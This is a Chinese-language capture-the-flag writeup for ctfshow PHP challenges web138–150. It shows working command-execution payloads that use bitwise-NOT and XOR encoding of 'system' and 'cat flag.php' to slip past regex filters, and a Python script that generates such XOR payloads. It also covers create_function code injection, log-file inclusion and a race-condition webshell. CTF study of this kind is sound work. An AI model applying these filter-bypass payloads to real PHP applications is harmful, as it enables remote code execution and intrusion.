---
title: "ctfshow Web入门[PHP特性] web138-150 Writeup"
date: 2022-08-13T17:14:21+08:00
draft: false
author: "X1r0z"

tags: ['php', 'ctf']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

PHP 特性最后几题, 过几天写个总结

这次主要是各种函数的利用, 位运算绕过正则, 条件竞争等等

<!--more-->

## web138

![20220813102414](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220813102414.png)

过滤了 `:`, 但是 `strripos()` 可以用数组绕过

本地测试报错

```
Warning: call_user_func() expects parameter 1 to be a valid callback, array must have exactly two members in D:\phpStudy\PHPTutorial\WWW\index.php on line 17
```

`call_user_func()` 文档 [https://www.php.net/manual/zh/function.call-user-func](https://www.php.net/manual/zh/function.call-user-func)

![20220813104914](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220813104914.png)

`call_user_func()` 可以以数组的形式调用静态方法

post 构造 payload 如下

```
ctfshow[]=ctfshow&ctfshow[]=getFlag
```

![20220813105051](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/20220813105051.png)

## web139

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131054170.png)

用之前的 `ls | tee 1` 下载失败, 估计是限制了权限

hint 提示是用 bash 的 if + sleep 配合 awk + cut 盲打 (类似时间盲注)

先放着...

## web140

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131103318.png)

f1 f2 只能含有小写字母和数字

注意 `intval($code) == 'ctfshow'` 这句里面是 `==`, 也就是说只要 `$code` 的值是不是以1开头的字符串, 那么整个表达式就会返回 true (强制类型转换, 左边和右边都变成0)

结合 eval 里面的构造, 想到了无参数读文件的 payload

```php
echo current(localeconv()); // .
```

`localeconv()` 返回结果是个数组, 数组的第一位是 `.`

`current()` 返回当前数组指针指向的值, 也就是 `.`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131114960.png)

hint 的 payload

```
f1=usleep&f2=usleep
```

测试发现下面的 payload 也行

```
f1=sleep&f2=sleep

f1=md5&f2=phpinfo
f1=md5&f2=md5

f1=sha1&f2=getcwd

f1=intval&f2=getcwd
f1=getcwd&f2=getcwd

f1=exec&f2=exec
f1=system&f2=system
```

思路就是找到一个函数, 使它的返回值为空, 空值 intval 之后也会变成0

## web141

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131125316.png)

v3 这个正则过滤了字母和数字

hint 提示是取反

参考文章 [https://blog.csdn.net/miuzzx/article/details/109143413](https://blog.csdn.net/miuzzx/article/details/109143413)

然后绕过 return 的方法要利用以下的 trick

> 在 PHP 中, 函数与数字进行运算的时候, 函数能够被正常执行

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131210383.png)

构造 payload

```php
<?php

echo urlencode(~'system');
echo '<br/>';
echo urlencode(~'cat flag.php');

?>
```

get 传参

```
v1=0&v2=0&v3=-(~'%8C%86%8C%8B%9A%92')(~'%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F')-
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131213481.png)

好像取反后的字符串不加引号也可以

## web142

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131216415.png)

????

直接乘以0

```
http://64c7d6e3-5a90-42c6-89f0-4452394edf28.challenge.ctf.show/?v1=0
```

0x36d 转成十进制是 877

传一个 0x0 也行

## web143

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131219598.png)

把 `&` `|` `~` 都过滤了, 不过思路已经很明显了... 我们需要找一个其它的位运算符

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131222935.png)

利用异或 `^`

利用之前命令执行那题的或运算的脚本, 稍微改一改

```python
import re

preg = '[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;'

def convertToURL(s):
    if s < 16:
        return '%0' + str(hex(s).replace('0x', ''))
    else:
        return '%' + str(hex(s).replace('0x', ''))

def generateDicts():
    dicts = {}
    for i in range(256):
        for j in range(256):
            if not re.match(preg, chr(i), re.I) and not re.match(preg, chr(j), re.I):
                k = i ^ j
                if k in range(32, 127):
                    if not k in dicts.keys():
                        dicts[chr(k)] = [convertToURL(i), convertToURL(j)]
    return dicts

def generatePayload(dicts, payload):
    s1 = ''
    s2 = ''
    for s in payload:
        s1 += dicts[s][0]
        s2 += dicts[s][1]
    return f'("{s1}"^"{s2}")'

dicts = generateDicts()
a = generatePayload(dicts, 'system')
b = generatePayload(dicts, 'cat flag.php')
print(a + b)
```

payload

`+` `-` 被过滤了, 可以用乘法 `*`

```
v1=0&v2=0&v3=*("%ff%ff%ff%ff%ff%ff"^"%8c%86%8c%8b%9a%92")("%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff"^"%9c%9e%8b%df%99%93%9e%98%d1%8f%97%8f")*
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131224074.png)

## web144

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131227987.png)

相当于没有过滤, 注意位置

```
http://a05ac3c9-5f45-43bc-b04b-84e682344966.challenge.ctf.show/?v1=0&v2=(~%27%8C%86%8C%8B%9A%92%27)(~%27%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F%27)&v3=-
```

## web145

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131434297.png)

四则运算都被过滤了, 但根据上面的思路, 找到一个能使函数正常执行的运算符即可

[https://www.php.net/manual/zh/language.operators.php](https://www.php.net/manual/zh/language.operators.php)

这里用 `|`, 其实 `||` 也是可以的

```
http://8a65ee90-18a4-4768-a040-0c874ca10ad0.challenge.ctf.show/?v1=0&v2=0&v3=|(~%27%8C%86%8C%8B%9A%92%27)(~%27%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F%27)|
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131443162.png)

hint 用的是三目运算符 `a ? b : c ` 的形式

## web146

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131445955.png)

三目运算符被 ban 了

上题的 payload 还能用

## web147

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131449811.png)

限制不能只为字母数字和下划线

hint 提示为创建匿名函数...

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131458431.png)

参考文章 [https://paper.seebug.org/755/](https://paper.seebug.org/755/)

使用根命名空间调用的方式, 在函数名前面加上 `\` 从而绕过正则过滤

```
GET: ?show=}system('cat flag.php');//
POST: ctf=\create_function
```

创建的匿名函数里面实际上也是字符串, 可以闭合大括号来执行任意代码 (否则不好直接回显)

注意要注释掉本来的 `}`

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131546615.png)

## web148

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131552192.png)

异或, payload 如下

```
http://2c320103-4835-4445-9bd3-5fcf2442be1f.challenge.ctf.show/?code=(%22%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%22^%22%98%9a%8b%a0%9c%8b%99%8c%97%90%88%a0%99%93%cf%98%22)();
```

## web149

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131606417.png)

条件竞争?

跑了好久好不容易成功一次结果发现 payload 填错了... 第二次跑一直没成功

后来换个思路, 直接覆盖写 index.php

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131619642.png)

正常执行命令

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131620301.png)

## web150

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131622601.png)

这个缩进属实有点... 当时还以为 `__autoload()` 是写在类里面的...

先通过变量覆盖构造 `..CTFSHOW..=CTFSHOW`, 因为 PHP 会自动将不合法的字符 `.` `[空格]` `[` 等替换为下划线

然后构造 `isVIP=true`, 最后通过包含 nginx 日志得到 flag

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131702204.png)

## web150_plus

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131705862.png)

日志包含被过滤了, 还能用 session 包含...

不过感觉不太对劲, 这么长一个类是用来干嘛的???

看了 hint 发现是利用 `__autoload()` 

于是查了一下 `class_exists()` 这个函数

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131706165.png)

默认会调用 `__autoload()` 函数

执行 phpinfo

```
http://c4bd5656-d41c-4aeb-a923-a78aa037167f.challenge.ctf.show/?..CTFSHOW..=phpinfo
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202208131709180.png)

??? 直接出来了

hint 给了个 exp

[https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py](https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py)

[https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md)

因为 phpinfo 中的 `$_FILES` 可以直接查看上传的临时文件名, 然后通过条件竞争, 包含该文件来创建 webshell
